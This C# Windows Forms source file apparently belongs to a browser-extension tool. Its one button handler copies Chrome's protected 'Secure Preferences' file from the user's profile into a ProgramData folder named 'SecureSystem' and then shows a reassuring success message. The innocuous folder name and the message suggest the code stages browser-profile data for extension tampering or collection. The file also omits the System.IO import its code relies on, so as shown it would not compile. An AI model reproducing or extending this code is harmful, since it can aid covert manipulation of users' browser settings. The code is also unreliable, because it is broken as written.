using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EklentiNOTREMOVED
{
    public partial class ekle : Form
    {
        public ekle()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string chromePreferencesPath = Path.Combine(localAppDataPath, @"Google\Chrome\User Data\Default\Secure Preferences");
            string targetFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "SecureSystem");

            // Hedef klasörü oluştur veya varsa geç
            if (!Directory.Exists(targetFolder))
            {
                Directory.CreateDirectory(targetFolder);
            }

            // Dosyayı kopyala
            string destinationFile = Path.Combine(targetFolder, "Secure Preferences");
            File.Copy(chromePreferencesPath, destinationFile, true);

            Console.WriteLine("Dosya başarıyla kopyalandı.");
            MessageBox.Show("İşlem Başarılı! güvenle bu pencereyi kapatabilirsiniz.");
        }
    }
}
